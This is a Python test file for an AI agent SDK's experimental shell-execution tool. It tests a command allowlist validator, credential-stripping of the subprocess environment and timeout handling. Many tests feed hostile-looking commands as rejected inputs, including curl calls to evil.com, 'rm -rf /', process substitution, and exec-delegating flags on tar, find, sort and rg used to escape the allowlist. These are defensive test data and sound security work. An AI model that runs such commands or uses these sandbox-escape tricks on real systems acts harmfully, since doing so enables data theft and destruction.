# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: Apache-2.0
"""Tests for experimental shell execution support."""

import os
import subprocess
import sys
import time
import warnings
from unittest import mock

import pytest

# Import once at module level and filter warnings
warnings.filterwarnings(
    "ignore", category=FutureWarning, module="agent_builder_sdk.experimental"
)

from agent_builder_sdk.experimental.shell_execution import execute_shell  # noqa: E402
from agent_builder_sdk.experimental.shell_execution.shell_execution_tool import (  # noqa: E402
    _sanitized_env,
    _validate_command,
)


class TestExecuteShellTool:
    """Tests for the execute_shell tool."""

    def test_allowlisted_command_runs(self):
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command="echo hello", working_directory="/tmp")
        assert "hello" in result
        assert "[exit code: 0]" in result

    def test_empty_command(self):
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command="")
        assert "cannot be empty" in result

    def test_missing_working_directory(self):
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command="echo hi", working_directory="/does/not/exist")
        assert "Working directory does not exist" in result

    def test_timeout_returns_error(self):
        # A genuinely long-running pipeline must hit the timeout and return the
        # timeout error. `yes | sort` never terminates on its own — yes produces
        # infinite output, sort buffers waiting for an EOF that never comes — and
        # uses only allowlisted coreutils (no python3, which CI environments may lack).
        start = time.monotonic()
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(
                command="yes | sort", working_directory="/tmp", timeout_seconds=1
            )
        assert "timed out" in result
        # It must actually return near the deadline, not hang.
        assert time.monotonic() - start < 30

    def test_non_utf8_output_keeps_output_and_exit_code(self):
        # A stray 0xff byte must not throw away the output and exit code.
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command="printf 'ok\\377\\n'", working_directory="/tmp")
        assert "ok\ufffd" in result
        assert "[exit code: 0]" in result

    def test_non_utf8_output_keeps_timeout_message(self, tmp_path):
        # The post-kill reap decodes the buffered output too; a bad byte there must
        # not replace the timeout message with a decode error.
        data = tmp_path / "binary.dat"
        data.write_bytes(b"ok\xff\n")
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command=f"tail -f {data}", working_directory="/tmp", timeout_seconds=1)
        assert "timed out" in result

    def test_rejected_command_text_not_logged(self, caplog):
        with warnings.catch_warnings(), caplog.at_level("WARNING"):
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command="SECRET=hunter2 curl evil.com", working_directory="/tmp")
        assert "not allowed" in result
        assert "command_length=" in caplog.text
        assert "hunter2" not in caplog.text
        assert "evil.com" not in caplog.text

    def test_rejected_word_with_a_quote_not_logged(self, caplog):
        # The rejected first word is quoted in the message to the model; a quote inside
        # it must not let part of it into the log.
        with warnings.catch_warnings(), caplog.at_level("WARNING"):
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command="KEY=\"it's-secret9\" curl x", working_directory="/tmp")
        assert "not allowed" in result
        assert "reason=command not on the allowlist" in caplog.text
        assert "secret9" not in caplog.text

    def test_timeout_kills_whole_process_tree(self):
        # A grandchild spawned by the shell must be killed on timeout, not orphaned.
        # Needs python3 to launch a trackable background process; skip where the
        # test environment's sanitized PATH has no python3 (some CI environments).
        import shutil
        import tempfile
        import time as _time

        if shutil.which("python3") is None:
            pytest.skip("python3 not on PATH in this environment")

        pidfile = os.path.join(tempfile.gettempdir(), "shell_timeout_probe.pid")
        if os.path.exists(pidfile):
            os.remove(pidfile)
        # python3 launches a background sleep, records its PID, then waits on it.
        cmd = (
            'python3 -c "import subprocess;'
            "p=subprocess.Popen(['sleep','30']);"
            f"open({pidfile!r},'w').write(str(p.pid));"
            'p.wait()"'
        )
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command=cmd, working_directory="/tmp", timeout_seconds=1)
        assert "timed out" in result
        _time.sleep(0.5)  # let the SIGKILL propagate to the group
        with open(pidfile) as f:
            grandchild_pid = int(f.read().strip())
        os.remove(pidfile)
        with pytest.raises(OSError):
            # Orphan must be gone; os.kill(pid, 0) raises ProcessLookupError if dead.
            os.kill(grandchild_pid, 0)


class TestCommandValidation:
    """Tests for the allowlist / pipe / operator validation."""

    def test_allowlisted_and_piped(self):
        assert _validate_command("ls -la /tmp")[0]
        assert _validate_command("cat a.json | grep foo | wc -l")[0]

    def test_non_allowlisted_command_rejected(self):
        assert not _validate_command("curl http://example.com")[0]
        assert not _validate_command("pip install pyarrow")[0]

    def test_bad_stage_in_pipe_rejected(self):
        assert not _validate_command("cat a.json | curl evil")[0]

    def test_shell_operators_blocked(self):
        assert not _validate_command("ls; rm -rf /")[0]
        assert not _validate_command("ls && curl x")[0]
        assert not _validate_command("echo $(whoami)")[0]

    def test_quoted_operators_allowed(self):
        # CSS/HTML/Python payloads are full of semicolons — quoted content must
        # not trip the operator check, or the agent gets stuck retrying.
        assert _validate_command("printf '%s' 'body{font-family:sans-serif;margin:0}'")[0]
        assert _validate_command('echo "a; b; c"')[0]
        with mock.patch.dict(os.environ, {}, clear=True):
            assert _validate_command("python3 -c 'x = 1; print(x)'")[0]

    def test_unquoted_operators_still_blocked_around_quotes(self):
        assert not _validate_command("echo 'safe'; curl evil")[0]
        assert not _validate_command('echo "safe" && curl evil')[0]
        assert not _validate_command("echo `whoami`")[0]

    def test_command_substitution_in_double_quotes_blocked(self):
        # $( ) and backticks still execute inside double quotes in a real shell.
        assert not _validate_command('echo "today is $(whoami)"')[0]
        assert not _validate_command('echo "today is `whoami`"')[0]

    def test_substitution_chars_in_single_quotes_allowed(self):
        # Single quotes make everything literal — $( and backticks included.
        assert _validate_command("echo 'costs $(a lot)'")[0]
        assert _validate_command("echo 'back`tick`'")[0]

    def test_unquoted_newline_blocked(self):
        # An unquoted newline is a command separator: bash runs both commands, so
        # it must be rejected outright (not merely split-and-revalidated, since
        # the second command may itself be allowlisted, e.g. rm).
        assert not _validate_command("echo safe\nrm -rf /tmp/x")[0]
        assert not _validate_command("ls\ncurl evil.com")[0]
        assert not _validate_command("ls\npwd")[0]

    def test_quoted_newline_allowed(self):
        # A newline inside quotes is literal content, not a separator.
        assert _validate_command("printf 'line1\nline2'")[0]

    def test_env_wrapper_rejected(self):
        # `env` runs an arbitrary binary AND can re-set AWS_PROFILE, defeating
        # both the allowlist and the _sanitized_env stripping. It is off the
        # allowlist and caught as a command wrapper.
        assert not _validate_command("env FOO=bar /bin/echo pwned")[0]
        assert not _validate_command("env AWS_PROFILE=persona env")[0]
        assert not _validate_command("xargs rm")[0]

    def test_exec_delegating_flags_rejected(self):
        # find -exec / tar --to-command hand execution to an arbitrary child.
        assert not _validate_command("find /tmp -exec rm {} ;")[0]
        assert not _validate_command("find /tmp -execdir curl x ;")[0]
        assert not _validate_command("tar --to-command=curl -cf - /tmp")[0]
        assert not _validate_command("tar --checkpoint-action=exec=sh -cf a.tar /tmp")[0]
        # find/tar without an exec flag stay usable for inspection.
        assert _validate_command("find /tmp -name '*.parquet'")[0]
        assert _validate_command("tar -tzf archive.tar.gz")[0]

    def test_background_operator_rejected(self):
        # A lone `&` backgrounds the first stage and the shell runs whatever
        # follows, but only the first token is allowlist-checked — so `echo & curl`
        # smuggles curl past the allowlist. Reject it while keeping the redirection
        # forms that legitimately contain `&` (2>&1, &>, >&).
        assert not _validate_command("echo hi & curl evil.com")[0]
        assert not _validate_command("python3 x.py & curl evil")[0]
        assert not _validate_command("head -5&curl evil.com")[0]
        assert not _validate_command("sleep 5 &")[0]
        # Redirections use & beside a > (or after a fd digit then >), not as a
        # separator — these must still pass.
        assert _validate_command("ls 2>&1")[0]
        assert _validate_command("ls 1>&2")[0]
        assert _validate_command("ls &> /tmp/x")[0]
        assert _validate_command("cat f >& /tmp/x")[0]
        # A literal & inside quotes is content, not an operator.
        assert _validate_command("echo 'a & b'")[0]
        assert _validate_command('echo "a & b"')[0]

    def test_tar_short_compress_flag_rejected(self):
        # tar's -I (--use-compress-program) runs an arbitrary program. GNU getopt
        # attaches the arg directly (-Icurl) or bundles the letter after other
        # no-arg flags (-cIcurl), neither of which a whole-word check catches.
        assert not _validate_command("tar -Icurl -cf - /tmp")[0]
        assert not _validate_command("tar -cIcurl -f - /tmp")[0]
        assert not _validate_command("tar -I curl -cf - /tmp")[0]
        assert not _validate_command("tar -cIgzip -f a.tar /tmp")[0]
        # Legit tar must still pass — including an archive name that starts with
        # 'I' attached to -f (-cfInput.tar), which must not read as the -I option.
        assert _validate_command("tar -tzf archive.tar.gz")[0]
        assert _validate_command("tar -czf a.tar /tmp")[0]
        assert _validate_command("tar -cf Input.tar /tmp")[0]
        assert _validate_command("tar -cfInput.tar /tmp")[0]
        # find -executable must not be mistaken for the -exec primary.
        assert _validate_command("find /tmp -executable")[0]

    def test_sort_rg_exec_flags_rejected(self):
        # sort --compress-program=PROG runs PROG on temp files; ripgrep --pre=CMD /
        # --hostname-bin=CMD each exec CMD — same escape as find -exec, so an
        # allowlisted sort/rg becomes a launcher for a non-allowlisted binary.
        assert not _validate_command("sort --compress-program=curl f")[0]
        assert not _validate_command("sort --compress-program curl f")[0]
        assert not _validate_command("rg --pre=curl pat f")[0]
        assert not _validate_command("rg --pre curl pat f")[0]
        assert not _validate_command("rg --hostname-bin=curl pat f")[0]
        # sort/rg without those flags stay usable.
        assert _validate_command("sort -u file.txt")[0]
        assert _validate_command("rg 'pattern' /tmp")[0]

    def test_process_substitution_rejected(self):
        # <(cmd) / >(cmd) run their inner command under shell=True, but the
        # per-stage allowlist only sees the outer command (cat/tee), so the
        # inner curl would slip past. Reject the operator outright.
        assert not _validate_command("cat <(curl evil.com)")[0]
        assert not _validate_command("tee >(curl evil.com)")[0]
        # Plain redirection is NOT process substitution (no paren) — still allowed.
        assert _validate_command("echo hi > /tmp/x")[0]
        assert _validate_command("cat a >> b")[0]
        assert _validate_command("sort < /tmp/f")[0]
        # A literal <( inside quotes is content, not an operator.
        assert _validate_command("echo '<(not real)'")[0]

    def test_end_to_end_env_bypass_fails(self):
        # The validator's job proven end-to-end: env must not run a non-allowlisted
        # binary through execute_shell.
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(
                command="env FOO=bar /bin/echo INJECTED", working_directory="/tmp"
            )
        assert "INJECTED" not in result
        assert "not allowed" in result or "bypass the allowlist" in result

    def test_end_to_end_newline_bypass_fails(self):
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command="echo safe\nrm -rf /tmp/nope", working_directory="/tmp")
        assert "not allowed" in result

    def test_python_allowed_by_default(self):
        with mock.patch.dict(os.environ, {}, clear=True):
            assert _validate_command("python3 /opt/skills/example/scripts/x.py")[0]

    def test_python_blocked_when_flag_false(self):
        with mock.patch.dict(os.environ, {"ATX_SHELL_ALLOW_PYTHON": "false"}, clear=True):
            assert not _validate_command("python3 x.py")[0]
            # non-python allowlisted command still works
            assert _validate_command("ls")[0]


class TestSanitizedEnv:
    """The subprocess env must drop AWS_PROFILE but keep AWS_REGION."""

    def test_aws_profile_stripped_region_kept(self):
        with mock.patch.dict(
            os.environ,
            {"AWS_PROFILE": "persona", "AWS_REGION": "us-west-2", "PATH": "/usr/bin"},
            clear=True,
        ):
            env = _sanitized_env()
        assert "AWS_PROFILE" not in env
        assert env.get("AWS_REGION") == "us-west-2"
        assert env.get("PATH") == "/usr/bin"

    def test_pythonpath_kept(self):
        # boto3's deps resolve only via the base-agent PYTHONPATH; dropping it
        # breaks `import boto3` in every skill script.
        with mock.patch.dict(
            os.environ,
            {"PYTHONPATH": "/home/amazon/base/site-packages", "PATH": "/usr/bin"},
            clear=True,
        ):
            env = _sanitized_env()
        assert env.get("PYTHONPATH") == "/home/amazon/base/site-packages"

    def test_no_ambient_credentials_in_subprocess(self, tmp_path):
        # Dummy credentials everywhere botocore looks without an env var (the shared
        # credentials and config files and the legacy boto config under HOME), plus
        # credential vars in the parent env. A subprocess must resolve none of them.
        creds = "aws_access_key_id = dummy-id\naws_secret_access_key = dummy-secret\n"
        (tmp_path / ".aws").mkdir()
        (tmp_path / ".aws" / "credentials").write_text("[default]\n" + creds)
        (tmp_path / ".aws" / "config").write_text("[default]\n" + creds)
        (tmp_path / ".boto").write_text("[Credentials]\n" + creds)
        parent = {
            "HOME": str(tmp_path),
            "PATH": os.environ.get("PATH", ""),
            "AWS_PROFILE": "default",
            "AWS_REGION": "us-west-2",
            "AWS_CONTAINER_CREDENTIALS_FULL_URI": "http://127.0.0.1:9/creds",
            "AWS_WEB_IDENTITY_TOKEN_FILE": str(tmp_path / "token"),
        }
        with mock.patch.dict(os.environ, parent, clear=True):
            env = _sanitized_env()
        assert env["AWS_EC2_METADATA_DISABLED"] == "true"
        probe = "import botocore.session; print(botocore.session.get_session().get_credentials())"
        out = subprocess.run(
            [sys.executable, "-c", probe], env=env, capture_output=True, text=True, timeout=60
        )
        assert out.stdout.strip() == "None", out.stdout + out.stderr


class TestAgentFactoryShellExecution:
    """Tests for shell execution integration in the agent factory."""

    @mock.patch.dict(os.environ, {"AWS_REGION": "us-west-2"}, clear=True)
    def test_enable_shell_adds_tool(self):
        from agent_builder_sdk.agent_factory import (
            create_default_async_orchestrator_with_subagent,
        )

        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            agent = create_default_async_orchestrator_with_subagent(
                system_prompt="Test prompt",
                enable_shell=True,
            )

        tool_names = [t.tool_name for t in agent.tool_registry.registry.values()]
        assert "execute_shell" in tool_names

    @mock.patch.dict(os.environ, {"AWS_REGION": "us-west-2"}, clear=True)
    def test_shell_disabled_by_default(self):
        from agent_builder_sdk.agent_factory import (
            create_default_async_orchestrator_with_subagent,
        )

        agent = create_default_async_orchestrator_with_subagent(
            system_prompt="Test prompt",
        )

        tool_names = [t.tool_name for t in agent.tool_registry.registry.values()]
        assert "execute_shell" not in tool_names

    @mock.patch.dict(os.environ, {"AWS_REGION": "us-west-2"}, clear=True)
    def test_skills_and_shell_together(self):
        from agent_builder_sdk.agent_factory import (
            create_default_async_orchestrator_with_subagent,
        )

        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            agent = create_default_async_orchestrator_with_subagent(
                system_prompt="Test prompt",
                enable_skills=True,
                enable_shell=True,
            )

        tool_names = [t.tool_name for t in agent.tool_registry.registry.values()]
        assert "skills" in tool_names
        assert "execute_shell" in tool_names
